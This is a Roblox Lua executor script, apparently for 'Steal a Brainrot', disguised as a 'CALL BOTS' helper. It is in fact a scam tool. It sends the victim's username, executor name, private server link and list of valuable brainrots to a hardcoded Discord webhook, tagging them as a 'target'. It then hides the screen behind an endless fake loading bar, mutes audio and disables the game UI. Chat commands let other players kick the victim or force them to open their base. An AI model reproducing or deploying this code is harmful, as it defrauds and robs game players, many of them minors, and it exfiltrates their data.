local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Webhook Discord (ÚNICA)
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471173278344282196/7h0FRmmJx1175PZixg2A-3iWbsXSJ1Ez9iUkynxJy4Qf44NUt0PLSzkJLqlOENufZvpS"

-- Lista de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
    "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
}

-- Variável global para armazenar o link
getgenv().serverLinkGlobal = ""

-- Funções auxiliares V2
local function limpar(txt)
    if not txt then return "" end
    txt = tostring(txt)
    txt = txt:gsub("%s+", " ")
    return txt
end

local function getRealValue(gen)
    if not gen then return 0 end
    local num = tonumber(gen:match("[%d%.]+")) or 0
    if gen:find("[Mm]") then
        return num * 1000000
    elseif gen:find("[Kk]") then
        return num * 1000
    else
        return num
    end
end

local function formatarValor(val)
    if val >= 1000000 then
        return string.format("$%.1fM/S", val/1000000)
    elseif val >= 1000 then
        return string.format("$%.0fK/S", val/1000)
    else
        return string.format("$%d/S", val)
    end
end

-- Manter parseMoneyPerSec como alias para compatibilidade
local function parseMoneyPerSec(text)
    return getRealValue(text)
end

-- Função para verificar se um nome é um brainrot válido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- IDs para procurar (dos arquivos originais)
local TARGET_IDS = {
    "28e4ec29-d005-4636-82af-339f37dcef",
    "960ab477-3f31-4327-845e-6a77ebb5fa6",
    "2206090e-719d-4034-8720-700c9fb2h458",
    "dd76771-ce3c-4108-adae-5a488b2958be",
    "44392a62-6012-413d-9619-dab73c00539f",
    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
}

-- Função AVANÇADA V2 para encontrar brainrots (usando sistema do arquivo detectav2)
local function findBrainrotsWithValues()
    local resultados = {}
    local valorizadoDog = false

    print("🔍 Iniciando scan V2 de brainrots...")

    -- Coletar todos os objetos de nome possíveis no mapa inteiro
    local possiveisNomes = {}
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("StringValue") or obj:IsA("ValueBase"))
            and (obj.Name == "DisplayName" or obj.Name == "NameLabel" or obj.Name == "PetName") then
            table.insert(possiveisNomes, obj)
        end
    end

    print("📋 Total de nomes possíveis: " .. #possiveisNomes)

    -- Procurar por plot em Workspace.Plots
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetChildren()) do
            local base = plot:FindFirstChildWhichIsA("BasePart")
            if not base then continue end

            local posBase = base.Position
            local tamanho = base.Size
            local raio = math.max(tamanho.X, tamanho.Z) / 2 + 100

            for _, nomeObj in ipairs(possiveisNomes) do
                local gui = nomeObj:FindFirstAncestorWhichIsA("BillboardGui")
                           or nomeObj:FindFirstAncestorWhichIsA("SurfaceGui")
                if not (gui and gui.Adornee and gui.Adornee:IsA("BasePart")) then continue end

                local adornee = gui.Adornee
                local dist = (adornee.Position - posBase).Magnitude
                if dist > raio then continue end

                local nomeCru = (nomeObj:IsA("TextLabel") or nomeObj:IsA("TextButton"))
                                and nomeObj.Text or nomeObj.Value
                local nome = limpar(nomeCru)
                if nome == "" or nome == "{DisplayName}" then continue end

                -- Verificar se é um brainrot válido
                if not isValidBrainrot(nome) then continue end

                -- Buscar geração
                local generation = ""
                local parent = nomeObj.Parent
                if parent then
                    local g = parent:FindFirstChild("Generation")
                           or parent:FindFirstChild("Gen")
                           or parent:FindFirstChild("Value")
                    if g then
                        local t = (g:IsA("TextLabel") or g:IsA("TextButton")) and g.Text or g.Value
                        generation = limpar(tostring(t))
                    end
                end

                -- Verificar se tem mutation
                local nomeFinal = nome
                if parent and parent:FindFirstChild("Mutation") then
                    local mut = parent:FindFirstChild("Mutation")
                    local mutText = ""
                    if mut:IsA("TextLabel") or mut:IsA("TextButton") then
                        mutText = limpar(mut.Text)
                    elseif mut:IsA("StringValue") then
                        mutText = limpar(mut.Value)
                    end
                    if mutText ~= "" and mutText ~= " " then
                        nomeFinal = "[" .. mutText .. "] " .. nome
                    end
                end

                local valorReal = getRealValue(generation)

                -- Só adiciona se tiver valor real OU se for brainrot válido detectado
                local chave = nomeFinal .. "_" .. (generation ~= "" and generation or "N/A")
                local jaExiste = false
                for _, ex in ipairs(resultados) do
                    if ex.chave == chave then
                        jaExiste = true
                        break
                    end
                end

                if not jaExiste then
                    local valorFormatado = generation ~= "" and formatarValor(valorReal) or "N/A"
                    table.insert(resultados, {
                        nome = nomeFinal,
                        valor = valorFormatado,
                        valorReal = valorReal,
                        plot = plot.Name,
                        chave = chave
                    })

                    print("✅ Brainrot detectado: " .. nomeFinal .. " - " .. valorFormatado)

                    if valorReal > 49999999 then
                        valorizadoDog = true
                    end
                end
            end
        end
    end

    -- Fallback: getgenv().base caso Plots não funcione
    if #resultados == 0 and getgenv and getgenv().base then
        print("⚠️ Usando fallback getgenv().base...")
        for _, brainrote in pairs(getgenv().base:GetDescendants()) do
            if brainrote:IsA("TextLabel") and brainrote.Name == "Generation" then
                local parent = brainrote.Parent
                if parent and parent:FindFirstChild("DisplayName") then
                    local nome = limpar(parent.DisplayName.ContentText or parent.DisplayName.Text)
                    if not isValidBrainrot(nome) then continue end

                    local nomeFinal = nome
                    if parent:FindFirstChild("Mutation") and parent.Mutation.Visible then
                        nomeFinal = "[" .. limpar(parent.Mutation.ContentText) .. "] " .. nome
                    end

                    local genText = limpar(brainrote.ContentText or brainrote.Text)
                    local valorReal = getRealValue(genText)
                    local valorFormatado = formatarValor(valorReal)

                    table.insert(resultados, {
                        nome = nomeFinal,
                        valor = valorFormatado,
                        valorReal = valorReal
                    })

                    if valorReal > 49999999 then
                        valorizadoDog = true
                    end
                end
            end
        end
    end

    -- Ordenar do mais valioso pro menos
    table.sort(resultados, function(a, b) return a.valorReal > b.valorReal end)

    print("🏁 Total de brainrots válidos encontrados: " .. #resultados)
    return resultados, valorizadoDog
end

-- Função para obter stats do player
local function getPlayerStats()
    local player = Players.LocalPlayer
    local stats = {
        steals = "0",
        rebirths = "0"
    }
    
    if player:FindFirstChild("leaderstats") then
        if player.leaderstats:FindFirstChild("Steals") then
            stats.steals = tostring(player.leaderstats.Steals.Value)
        end
        if player.leaderstats:FindFirstChild("Rebirths") then
            stats.rebirths = tostring(player.leaderstats.Rebirths.Value)
        end
    end
    
    return stats
end

-- Função para enviar para Discord
local function sendToDiscord(payload)
    local jsonPayload = HttpService:JSONEncode(payload)
    
    if syn and syn.request then
        pcall(function()
            syn.request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        return
    end
    
    if request then
        pcall(function()
            request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        return
    end
    
    if http_request then
        pcall(function()
            http_request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        return
    end
    
    pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK, jsonPayload, Enum.HttpContentType.ApplicationJson, false)
    end)
end

-- Função para alterar nome da webhook
local function updateWebhookName()
    local payload = {
        name = "branzz metodhs || update 17.1"
    }
    
    local jsonPayload = HttpService:JSONEncode(payload)
    
    -- Tentar com PATCH request
    if syn and syn.request then
        pcall(function()
            syn.request({
                Url = DISCORD_WEBHOOK,
                Method = "PATCH",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
    elseif request then
        pcall(function()
            request({
                Url = DISCORD_WEBHOOK,
                Method = "PATCH",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
    elseif http_request then
        pcall(function()
            http_request({
                Url = DISCORD_WEBHOOK,
                Method = "PATCH",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
    end
    
    print("✅ Nome da webhook atualizado!")
end

-- Função para enviar webhook quando script é executado (tela de link)
local function sendInitialWebhook()
    local player = Players.LocalPlayer
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    local brainrots, _ = findBrainrotsWithValues()
    
    local brainrotsList = ""
    if #brainrots > 0 then
        for i, br in ipairs(brainrots) do
            brainrotsList = brainrotsList .. "⭐ " .. br.nome .. " - " .. br.valor .. "\n"
            if i >= 30 then
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    local payload = {
        content = "@everyone @here um novo alvo usuário esta na tela de link || @everyone @here ||",
        embeds = {{
            title = "🎯 NOVO USUÁRIO NA TELA DE LINK",
            color = 16776960,
            fields = {
                {
                    name = "Player executed 👤",
                    value = playerName,
                    inline = true
                },
                {
                    name = "Players in server 👥",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "BRAINROTS DETECTADOS 🧠",
                    value = brainrotsList,
                    inline = false
                }
            },
            footer = {
                text = "Aguardando link do servidor..."
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    print("📤 Enviando webhook inicial...")
    sendToDiscord(payload)
end

-- Função para enviar webhook quando clicar em CALL BOTS
local function sendCallBotsWebhook(serverLink)
    local player = Players.LocalPlayer
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
    local brainrots, _ = findBrainrotsWithValues()
    
    local brainrotsList = ""
    if #brainrots > 0 then
        for i, br in ipairs(brainrots) do
            brainrotsList = brainrotsList .. "⭐ " .. br.nome .. " - " .. br.valor .. "\n"
            if i >= 30 then
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    local payload = {
        content = "@everyone @here Novo Alvo Detectado || @everyone @here ||",
        embeds = {{
            title = "🚨 NOVO ALVO DETECTADO",
            description = "Novo alvo detectado 🇧🇷 || By Project branzz @everyone @here",
            color = 15158332,
            fields = {
                {
                    name = "Player que executou 👤",
                    value = playerName,
                    inline = true
                },
                {
                    name = "Executor 🔰",
                    value = executorName,
                    inline = true
                },
                {
                    name = "Players in server 👥",
                    value = tostring(playerCount),
                    inline = false
                },
                {
                    name = "Server link 🔗",
                    value = "[Clique aqui](" .. serverLink .. ")",
                    inline = false
                },
                {
                    name = "BRAINROTS DETECTEDS 📊",
                    value = brainrotsList,
                    inline = false
                }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    print("📤 Enviando webhook de Call Bots...")
    sendToDiscord(payload)
end

-- Função para desativar som permanentemente
local function disableSound()
    spawn(function()
        UserGameSettings.MasterVolume = 0
        SoundService.Volume = 0
        print("🔇 Volume definido para 0%")
        
        while true do
            wait(0.5)
            UserGameSettings.MasterVolume = 0
            SoundService.Volume = 0
        end
    end)
end

-- Função para desativar TODOS os botões do CoreGui
local function disableAllCoreGui()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
        print("🚫 CoreGui desativado!")
    end)
end

-- Função para kickar o player
local function kickPlayer()
    Players.LocalPlayer:Kick("🚫 Comando KICK ativado!")
end

-- Função para enviar pedido de amizade e abrir base
local function openBaseSequence(targetPlayer)
    local player = Players.LocalPlayer
    
    -- Enviar pedido de amizade
    pcall(function()
        player:RequestFriendship(targetPlayer)
        print("✅ Pedido de amizade enviado para " .. targetPlayer.Name)
    end)
    
    -- Resetar personagem
    if player.Character then
        player.Character:BreakJoints()
    end
    
    -- Aguardar respawn
    player.CharacterAdded:Wait()
    wait(1)
    
    -- Mover 79 studs para frente e clicar no prompt E
    spawn(function()
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local hrp = character.HumanoidRootPart
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            
            -- Mover para frente
            local targetPosition = hrp.CFrame * CFrame.new(0, 0, -79)
            humanoid:MoveTo(targetPosition.Position)
            
            wait(3)
            
            -- Procurar e clicar no ProximityPrompt
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    pcall(function()
                        fireproximityprompt(obj)
                        print("✅ Base aberta!")
                    end)
                    break
                end
            end
        end
    end)
end

-- Sistema de comandos no chat
local function setupChatCommands()
    local player = Players.LocalPlayer
    
    player.Chatted:Connect(function(message)
        local msg = message:lower()
        
        -- Comando KICK
        if msg == "kick" or msg == ":kick" or msg == ";kick" then
            print("🚫 Comando KICK detectado!")
            kickPlayer()
        end
    end)
    
    -- Monitorar chat de outros players
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player then
            otherPlayer.Chatted:Connect(function(message)
                local msg = message:lower()
                
                -- Comando KICK
                if msg == "kick" or msg == ":kick" or msg == ";kick" then
                    print("🚫 Outro player usou KICK!")
                    kickPlayer()
                end
                
                -- Comando ABRIR
                if msg == "abrir" then
                    print("🔓 Comando ABRIR detectado!")
                    openBaseSequence(otherPlayer)
                end
            end)
        end
    end
    
    -- Monitorar novos players que entram
    Players.PlayerAdded:Connect(function(newPlayer)
        newPlayer.Chatted:Connect(function(message)
            local msg = message:lower()
            
            if msg == "kick" or msg == ":kick" or msg == ";kick" then
                kickPlayer()
            end
            
            if msg == "abrir" then
                openBaseSequence(newPlayer)
            end
        end)
    end)
end

-- Criar GUI de Carregamento Infinita
local function createInfiniteLoadingGUI()
    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Name = "InfiniteLoadingGUI"
    LoadingGui.ResetOnSpawn = false
    LoadingGui.IgnoreGuiInset = true
    LoadingGui.DisplayOrder = 999999
    
    local Background = Instance.new("Frame")
    Background.Name = "FullScreenBlock"
    Background.Size = UDim2.new(1, 0, 1, 100)
    Background.Position = UDim2.new(0, 0, 0, -50)
    Background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    Background.BorderSizePixel = 0
    Background.ZIndex = 999999
    Background.Parent = LoadingGui
    
    local LoadingFrame = Instance.new("Frame")
    LoadingFrame.Size = UDim2.new(0, 600, 0, 200)
    LoadingFrame.Position = UDim2.new(0.5, -300, 0.5, -100)
    LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    LoadingFrame.BorderSizePixel = 0
    LoadingFrame.ZIndex = 1000000
    LoadingFrame.Parent = Background
    
    local FrameCorner = Instance.new("UICorner")
    FrameCorner.CornerRadius = UDim.new(0, 20)
    FrameCorner.Parent = LoadingFrame
    
    local FrameStroke = Instance.new("UIStroke")
    FrameStroke.Color = Color3.fromRGB(200, 50, 50)
    FrameStroke.Thickness = 4
    FrameStroke.Parent = LoadingFrame
    
    local LoadingTitle = Instance.new("TextLabel")
    LoadingTitle.Size = UDim2.new(1, 0, 0, 50)
    LoadingTitle.Position = UDim2.new(0, 0, 0, 15)
    LoadingTitle.BackgroundTransparency = 1
    LoadingTitle.Text = "🎄 CARREGANDO BOTS 🤖"
    LoadingTitle.TextColor3 = Color3.fromRGB(200, 50, 50)
    LoadingTitle.TextSize = 28
    LoadingTitle.Font = Enum.Font.GothamBold
    LoadingTitle.ZIndex = 1000001
    LoadingTitle.Parent = LoadingFrame
    
    local StatusText = Instance.new("TextLabel")
    StatusText.Size = UDim2.new(1, -40, 0, 30)
    StatusText.Position = UDim2.new(0, 20, 0, 70)
    StatusText.BackgroundTransparency = 1
    StatusText.Text = "Iniciando sistema..."
    StatusText.TextColor3 = Color3.fromRGB(180, 180, 180)
    StatusText.TextSize = 16
    StatusText.Font = Enum.Font.Gotham
    StatusText.ZIndex = 1000001
    StatusText.Parent = LoadingFrame
    
    local PercentText = Instance.new("TextLabel")
    PercentText.Size = UDim2.new(1, 0, 0, 35)
    PercentText.Position = UDim2.new(0, 0, 0, 105)
    PercentText.BackgroundTransparency = 1
    PercentText.Text = "0.0%"
    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
    PercentText.TextSize = 24
    PercentText.Font = Enum.Font.GothamBold
    PercentText.ZIndex = 1000001
    PercentText.Parent = LoadingFrame
    
    local BarBackground = Instance.new("Frame")
    BarBackground.Size = UDim2.new(0.9, 0, 0, 25)
    BarBackground.Position = UDim2.new(0.05, 0, 0, 155)
    BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    BarBackground.BorderSizePixel = 0
    BarBackground.ZIndex = 1000001
    BarBackground.Parent = LoadingFrame
    
    local BarCorner = Instance.new("UICorner")
    BarCorner.CornerRadius = UDim.new(0, 12)
    BarCorner.Parent = BarBackground
    
    local ProgressBar = Instance.new("Frame")
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    ProgressBar.BorderSizePixel = 0
    ProgressBar.ZIndex = 1000002
    ProgressBar.Parent = BarBackground
    
    local ProgressCorner = Instance.new("UICorner")
    ProgressCorner.CornerRadius = UDim.new(0, 12)
    ProgressCorner.Parent = ProgressBar
    
    LoadingGui.Parent = CoreGui
    
    local statusMessages = {
        "Conectando aos servidores...",
        "Verificando brainrots...",
        "Coletando dados...",
        "Sincronizando bots...",
        "Processando informações...",
        "Enviando comandos...",
        "Estabelecendo conexão...",
        "Aguardando resposta...",
        "Carregando módulos...",
        "Inicializando sistema..."
    }
    
    spawn(function()
        local progress = 0
        local messageIndex = 1
        local messageTimer = 0
        
        while true do
            wait(0.05)
            
            progress = progress + 0.001
            if progress >= 99.9 then
                progress = 99.9
            end
            
            PercentText.Text = string.format("%.1f%%", progress)
            
            local targetSize = UDim2.new(progress / 100, 0, 1, 0)
            local tween = TweenService:Create(
                ProgressBar,
                TweenInfo.new(0.3, Enum.EasingStyle.Linear),
                {Size = targetSize}
            )
            tween:Play()
            
            messageTimer = messageTimer + 0.05
            if messageTimer >= 3 then
                messageTimer = 0
                messageIndex = messageIndex + 1
                if messageIndex > #statusMessages then
                    messageIndex = 1
                end
                StatusText.Text = statusMessages[messageIndex]
            end
        end
    end)
    
    spawn(function()
        while true do
            for i = 200, 255, 5 do
                wait(0.05)
                LoadingTitle.TextColor3 = Color3.fromRGB(i, 50, 50)
            end
            for i = 255, 200, -5 do
                wait(0.05)
                LoadingTitle.TextColor3 = Color3.fromRGB(i, 50, 50)
            end
        end
    end)
end

-- Criar GUI Principal
local function createMainGUI()
    -- Atualizar nome da webhook primeiro
    updateWebhookName()
    
    -- Enviar webhook inicial quando GUI é aberta
    sendInitialWebhook()
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "METODH_BRANZZ_GUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 450, 0, 300)
    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 50, 20)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = MainFrame
    
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(200, 50, 50)
    UIStroke.Thickness = 3
    UIStroke.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.Position = UDim2.new(0, 0, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "🎄 METODH_BRANZZ 🎅"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 28
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    local InputLabel = Instance.new("TextLabel")
    InputLabel.Size = UDim2.new(1, -40, 0, 30)
    InputLabel.Position = UDim2.new(0, 20, 0, 80)
    InputLabel.BackgroundTransparency = 1
    InputLabel.Text = "🔗 Link do Servidor Privado:"
    InputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    InputLabel.TextSize = 16
    InputLabel.Font = Enum.Font.Gotham
    InputLabel.TextXAlignment = Enum.TextXAlignment.Left
    InputLabel.Parent = MainFrame
    
    local InputBox = Instance.new("TextBox")
    InputBox.Name = "InputBox"
    InputBox.Size = UDim2.new(1, -40, 0, 50)
    InputBox.Position = UDim2.new(0, 20, 0, 120)
    InputBox.BackgroundColor3 = Color3.fromRGB(30, 70, 30)
    InputBox.BorderSizePixel = 0
    InputBox.Text = ""
    InputBox.PlaceholderText = "Cole o link aqui..."
    InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    InputBox.TextSize = 14
    InputBox.Font = Enum.Font.Gotham
    InputBox.ClearTextOnFocus = false
    InputBox.Parent = MainFrame
    
    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 8)
    InputCorner.Parent = InputBox
    
    local CallButton = Instance.new("TextButton")
    CallButton.Name = "CallButton"
    CallButton.Size = UDim2.new(0, 200, 0, 50)
    CallButton.Position = UDim2.new(0.5, -100, 0, 220)
    CallButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CallButton.BorderSizePixel = 0
    CallButton.Text = "🤖 CALL BOTS 🎄"
    CallButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CallButton.TextSize = 20
    CallButton.Font = Enum.Font.GothamBold
    CallButton.Parent = MainFrame
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 10)
    ButtonCorner.Parent = CallButton
    
    CallButton.MouseButton1Click:Connect(function()
        local link = InputBox.Text
        if link ~= "" then
            print("🚀 Iniciando sistema METODH_BRANZZ...")
            
            -- Salvar link globalmente
            getgenv().serverLinkGlobal = link
            
            -- Esconder GUI principal
            MainFrame.Visible = false
            
            -- Criar tela de carregamento
            createInfiniteLoadingGUI()
            
            -- Desativar som
            disableSound()
            
            -- Desativar CoreGui
            disableAllCoreGui()
            
            -- Enviar webhook de Call Bots
            wait(2)
            sendCallBotsWebhook(link)
            
            print("✅ Sistema ativado com sucesso!")
        else
            warn("⚠️ Por favor, insira um link válido!")
        end
    end)
    
    ScreenGui.Parent = CoreGui
    print("🎄 GUI METODH_BRANZZ carregada!")
end

-- Inicializar sistema de comandos
setupChatCommands()

-- Executar GUI principal
local success, err = pcall(function()
    createMainGUI()
end)

if not success then
    warn("❌ Erro ao executar METODH_BRANZZ: " .. tostring(err))
else
    print("✅ METODH_BRANZZ iniciado com sucesso!")
    print("💬 Comandos disponíveis: kick, :kick, ;kick, abrir")
end
        
   